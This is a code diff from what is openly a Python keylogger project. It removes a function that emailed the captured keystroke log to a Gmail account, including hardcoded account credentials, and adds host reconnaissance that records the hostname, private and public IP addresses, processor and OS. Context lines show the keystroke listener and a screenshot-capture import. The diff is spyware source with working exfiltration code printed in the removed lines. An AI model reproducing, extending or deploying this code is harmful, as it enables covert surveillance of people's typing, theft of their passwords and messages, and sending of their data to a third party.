@@ -28,17 +28,11 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
-# Library for email related functions.
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import smtplib
 
 # Log file 
 
 keys_info = "key_log.txt"
-
+system_info = "sys_info.txt"
 file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
 extend = "\\"
 
@@ -75,34 +69,22 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-email_address = "keyloggerproj67@gmail.com"
-email_password = "Higoogle@1167"
-toaddress = "keyloggerproj67@gmail.com"
+# Getting system information
+def get_system_info():
+    with open(file_path + extend + "sys_info.txt", "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get('https://api.ipify.org').text
+            f.write("Public IP Address: " + public_ip + "\n")
+        except Exception as e:
+            f.write("Could not get public IP address: " + str(e))
+        
+        f.write("Processor: " + platform.processor() + "\n")
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + '\n')
+        f.write("Hostname: " + hostname + '\n')
+        f.write("Private IP Address: " + IPAddr + '\n')
 
-# Email function to send the key log file.
-def send_email(filename, attatchment, toaddr):
-    fromaddr = email_address
-    msg = MIMEMultipart()
-    msg['From'] = fromaddr
-    msg['To'] = toaddr
-    msg['Subject'] = "Keylogger Log File"
-    body = "Please find the attached keylogger log file."
-    msg.attach(MIMEText(body, 'plain'))
-    filename = filename
-    attachment = open(attatchment, "rb")
-    p = MIMEBase('application', 'octet-stream')
-    p.set_payload(attachment.read())
-    encoders.encode_base64(p)
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-    msg.attach(p)    
-    server_keylogger = smtplib.SMTP('smtp.gmail.com', 587)
-    server_keylogger.starttls()
-    server_keylogger.login(fromaddr, email_password)
-    text = msg.as_string()
-    server_keylogger.sendmail(fromaddr, toaddr, text)
-    server_keylogger.quit()
-
-send_email(keys_info, file_path + extend + keys_info, toaddress)
-
-
+get_system_info()
 
